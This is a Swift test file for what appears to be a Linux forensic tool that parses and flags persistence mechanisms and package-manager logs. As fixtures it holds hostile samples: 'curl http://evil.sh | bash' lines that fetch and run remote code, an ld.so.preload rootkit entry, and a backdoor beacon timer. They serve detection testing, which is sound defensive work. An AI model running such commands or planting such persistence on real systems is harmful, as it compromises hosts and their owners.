//
//  PersistencePackageTests.swift
//  StrataTests
//
//  Covers Bundle B: the expanded persistence parsers (systemd timers,
//  ld.so.preload, XDG autostart, boot/shell scripts) and analyzer, plus the
//  package-manager log parsers (dpkg/apt/yum/dnf) and the package analyzer.
//

import Testing
import Foundation
@testable import Strata

struct PersistenceExpansionParserTests {

    @Test func parsesSystemdTimer() throws {
        let timer = try #require(LinuxPersistenceParser.parseSystemdTimer(text: """
        [Unit]
        Description=Daily backdoor beacon

        [Timer]
        OnCalendar=*-*-* 03:00:00
        OnBootSec=5min
        Unit=beacon.service

        [Install]
        WantedBy=timers.target
        """, sourceFile: "/etc/systemd/system/beacon.timer"))
        #expect(timer.kind == .systemdTimer)
        #expect(timer.unitName == "beacon.timer")
        #expect(timer.command == "beacon.service")
        #expect(timer.schedule?.contains("03:00:00") == true)
        #expect(timer.detail == "Daily backdoor beacon")
    }

    @Test func timerDefaultsTriggeredUnitFromName() throws {
        let timer = try #require(LinuxPersistenceParser.parseSystemdTimer(
            text: "[Timer]\nOnCalendar=hourly\n", sourceFile: "/etc/systemd/system/sync.timer"))
        #expect(timer.command == "sync.service")
    }

    @Test func parsesLdPreload() {
        let entries = LinuxPersistenceParser.parseLdPreload(
            text: "# rootkit\n/lib/x86_64-linux-gnu/libprocesshider.so\n/tmp/.evil.so\n",
            sourceFile: "/etc/ld.so.preload")
        #expect(entries.count == 2)
        #expect(entries.allSatisfy { $0.kind == .ldPreload })
        #expect(entries[1].command == "/tmp/.evil.so")
    }

    @Test func parsesAutostart() throws {
        let auto = try #require(LinuxPersistenceParser.parseAutostart(text: """
        [Desktop Entry]
        Type=Application
        Name=Updater
        Exec=/home/eve/.config/.update.sh
        X-GNOME-Autostart-enabled=true
        """, sourceFile: "/home/eve/.config/autostart/update.desktop"))
        #expect(auto.kind == .xdgAutostart)
        #expect(auto.command == "/home/eve/.config/.update.sh")
        #expect(auto.detail == "Updater")
    }

    @Test func parsesBootScriptAllLinesButFiltersScaffolding() {
        let entries = LinuxPersistenceParser.parseScript(text: """
        #!/bin/sh
        # rc.local
        PATH=/usr/bin
        if [ -f /tmp/.x ]; then
          /tmp/.x &
        fi
        /usr/local/bin/legit-thing
        exit 0
        """, kind: .initScript, sourceFile: "/etc/rc.local", suspiciousOnly: false)
        // Shebang, comment, assignment, if/fi scaffolding, and `exit 0` dropped.
        #expect(entries.contains { $0.command.contains("/tmp/.x &") })
        #expect(entries.contains { $0.command.contains("legit-thing") })
        #expect(!entries.contains { $0.command.hasPrefix("PATH=") })
        #expect(!entries.contains { $0.command == "exit 0" })
    }

    @Test func shellInitOnlyKeepsExecutionLines() {
        let entries = LinuxPersistenceParser.parseScript(text: """
        # .bashrc
        export PS1='\\u@\\h'
        alias ll='ls -la'
        curl http://evil.sh | bash
        """, kind: .shellInit, sourceFile: "/home/jane/.bashrc",
        user: "jane", suspiciousOnly: true)
        #expect(entries.count == 1)
        #expect(entries[0].command.contains("curl"))
        #expect(entries[0].user == "jane")
    }
}

struct PersistenceAnalyzerExpandedTests {

    private func analyze(_ entries: [LinuxPersistenceEntry]) -> [Finding] {
        LinuxPersistenceAnalyzer().analyze(context: AnalysisContext(
            files: [], events: [], timeline: [], registryValues: [], linuxPersistence: entries))
    }

    @Test func ldPreloadAlwaysFlaggedHigh() {
        let f = analyze([LinuxPersistenceEntry(kind: .ldPreload,
                                               command: "/usr/lib/libnice.so", sourceFile: "/etc/ld.so.preload")])
        #expect(f.count == 1)
        #expect(f[0].severity == .high)
        #expect(f[0].technique?.attackID == "T1574.006")
    }

    @Test func timerWithStagingCommandIsHigh() {
        let f = analyze([LinuxPersistenceEntry(kind: .systemdTimer, schedule: "hourly",
                                               command: "/tmp/.beacon", unitName: "b.timer",
                                               sourceFile: "/etc/systemd/system/b.timer")])
        #expect(f.contains { $0.severity == .high && $0.technique?.attackID == "T1543.002" })
    }

    @Test func shellInitEntryFlagged() {
        let f = analyze([LinuxPersistenceEntry(kind: .shellInit, user: "jane",
                                               command: "curl http://evil/x | bash",
                                               sourceFile: "/home/jane/.bashrc")])
        #expect(f.contains { $0.technique?.attackID == "T1546.004" })
    }

    @Test func benignAutostartNotFlagged() {
        let f = analyze([LinuxPersistenceEntry(kind: .xdgAutostart,
                                               command: "/usr/bin/nm-applet", unitName: "nm.desktop",
                                               sourceFile: "/etc/xdg/autostart/nm.desktop")])
        #expect(f.isEmpty)   // no staging path / tooling -> not flagged
    }
}

struct PackageParserTests {

    @Test func parsesDpkgLog() {
        let events = PackageParser.parseDpkgLog(text: """
        2026-06-10 12:00:01 install nginx:amd64 <none> 1.18.0-0ubuntu1
        2026-06-10 12:00:02 status unpacked nginx:amd64 1.18.0-0ubuntu1
        2026-06-10 12:05:00 remove oldpkg:amd64 1.0 <none>
        2026-06-10 12:06:00 upgrade curl:amd64 7.68.0 7.68.1
        """, sourceFile: "/var/log/dpkg.log")
        #expect(events.count == 3)   // status line dropped
        let install = events.first { $0.action == .install }
        #expect(install?.package == "nginx")
        #expect(install?.version == "1.18.0-0ubuntu1")
        #expect(install?.timestamp != nil)
        #expect(events.contains { $0.action == .remove && $0.package == "oldpkg" })
        #expect(events.contains { $0.action == .upgrade && $0.version == "7.68.1" })
    }

    @Test func parsesAptHistoryBlock() {
        let events = PackageParser.parseAptHistory(text: """
        Start-Date: 2026-06-10  12:00:00
        Commandline: apt install nmap
        Install: nmap:amd64 (7.80), libpcap:amd64 (1.9, automatic)
        Remove: telnet:amd64 (0.17)
        End-Date: 2026-06-10  12:00:09
        """, sourceFile: "/var/log/apt/history.log")
        #expect(events.count == 3)
        #expect(events.contains { $0.package == "nmap" && $0.version == "7.80" && $0.action == .install })
        #expect(events.contains { $0.package == "libpcap" && $0.action == .install })  // comma inside () respected
        #expect(events.contains { $0.package == "telnet" && $0.action == .remove })
        #expect(events.allSatisfy { $0.timestamp != nil })
    }

    @Test func parsesYumLogWithYearInference() {
        let anchor = Date(timeIntervalSince1970: 1_780_000_000) // mid-2026
        let events = PackageParser.parseYumLog(text: """
        Jun 10 12:00:00 Installed: nmap-7.80-1.x86_64
        Jun 10 12:01:00 Erased: telnet-0.17-1.x86_64
        Jun 10 12:02:00 Updated: curl-7.80.0-1.x86_64
        """, sourceFile: "/var/log/yum.log", anchor: anchor, manager: .yum)
        #expect(events.count == 3)
        let nmap = events.first { $0.package == "nmap" }
        #expect(nmap?.action == .install)
        #expect(nmap?.version == "7.80-1")
        #expect(nmap?.timestamp != nil)
        #expect(events.contains { $0.package == "telnet" && $0.action == .remove })
    }
}

struct PackageAnalyzerTests {

    private func analyze(_ events: [PackageEvent]) -> [Finding] {
        PackageAnalyzer().analyze(context: AnalysisContext(
            files: [], events: [], timeline: [], registryValues: [], packages: events))
    }

    private func ev(_ action: PackageEvent.Action, _ pkg: String, t: TimeInterval = 1000) -> PackageEvent {
        PackageEvent(timestamp: Date(timeIntervalSince1970: t), action: action, package: pkg,
                     manager: .apt, sourceFile: "/var/log/apt/history.log")
    }

    @Test func flagsOffensiveToolInstall() {
        let f = analyze([ev(.install, "nmap"), ev(.install, "socat"), ev(.install, "nginx")])
        #expect(f.contains { $0.title.contains("nmap") && $0.technique?.attackID == "T1588.002" })
        #expect(f.contains { $0.title.contains("socat") })
        #expect(!f.contains { $0.title.contains("nginx") })   // benign
    }

    @Test func flagsRemovalBurst() {
        let rows = (0..<20).map { ev(.remove, "pkg\($0)", t: 5000) }   // same minute
        let f = analyze(rows)
        #expect(f.contains { $0.title.contains("Mass package removal") && $0.technique?.attackID == "T1070" })
    }

    @Test func normalActivityYieldsNothing() {
        let f = analyze([ev(.install, "vim"), ev(.upgrade, "curl"), ev(.remove, "oldlib")])
        #expect(f.isEmpty)
    }
}
